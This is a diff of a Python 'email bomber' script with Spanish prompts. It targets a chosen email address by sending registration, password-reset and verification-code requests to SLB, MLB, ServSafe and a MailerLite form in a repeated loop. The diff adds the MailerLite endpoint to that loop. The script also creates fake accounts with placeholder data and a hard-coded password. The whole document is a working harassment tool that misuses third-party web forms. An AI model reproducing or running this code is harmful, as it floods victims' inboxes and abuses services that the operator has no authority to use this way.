@@ -11,7 +11,7 @@ v = Fore.LIGHTGREEN_EX
 re = Fore.LIGHTRED_EX
 w = Fore.LIGHTWHITE_EX
 c = Fore.LIGHTCYAN_EX
-os.system("cls")
+os.system("clear")
 def portada():
     print(f"""{re}
   ___________________  _____      _____               _____      _____  .___.____     
@@ -32,12 +32,14 @@ def opc():
     print(f"{w}2.Salir")
 
 opc()
+url7 = "https://app.mailerlite.com/webforms/submit/l1d7r5?callback=jQuery111305331636818546479_1649526738285&fields[email]=" + str("{}".format(correo)) +"&ml-submit=1&ajax=1&guid=&_=1649526738286"
 url5 = 'https://profile.mlb.com/api/v1/authn/recovery/password'
 url4 = 'https://profile.mlb.com/api/v1/users?activate=true'
 url2 = "https://api.slb.com/api/auth/password/forgot?emailAddress=" + str("{}".format(correo))+"&emailTemplateId={0DA48535-7880-4670-AC80-8164330B907F}"
 url1 = 'https://api.slb.com/api/auth/register'
 url3 = "https://myprofile-ext.servsafe.com/EmailVerification/SendVerificationCode?Site=servsafe.com&Email=" + str("{}".format(correo)) + "&Language=en-US"
 def register1():
+    r7 = requests.get(url7)
     r2 = requests.get(url3)
     _json ={"EmailAddress": "{}".format(correo), "Password" : "Nicolas001?", "RegistrationSource" : "Connect", "FirstName" : "asdasdas", "LastName" : "dasdasd", "Affiliation" : "30", "Company" : "asdasd", "JobTitle" : "asdasdasd", "Region" : "AD", "EmailTemplateId" : "{496E231C-DB8B-40FA-B1A6-414429AF33AE}","RegistrationSource" : "SLBCom"}
     _headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"}
@@ -54,6 +56,7 @@ def register1():
 def enviof1():
     i=1
     while i <= 5:
+        r7 = requests.get(url7)
         r2 = requests.get(url3)
         r = requests.post(url2)
         _json3 = {"username":"{}".format(correo),"factorType":"EMAIL","relayState":"https://www.mlb.com"}
@@ -75,7 +78,7 @@ def opciones():
     if necesario_crear_correo == "SI": 
       print(f"{c}El correo a hacer spam es {correo}")
       enviof1()
-      os.system("cls")
+      os.system("clear")
       portada()
       opc()
       opciones()
@@ -83,7 +86,7 @@ def opciones():
      print(f"{c}El correo a hacer spam es {correo}")
      register1()
      enviof1()
-     os.system("cls")
+     os.system("clear")
      portada()
      opc()
      opciones()
@@ -94,7 +97,7 @@ def opciones():
  else:
     print(f"{re}Digite una opcion valida...")
     sleep(3)
-    os.system("cls")
+    os.system("clear")
     portada()
     opc()
     opciones()
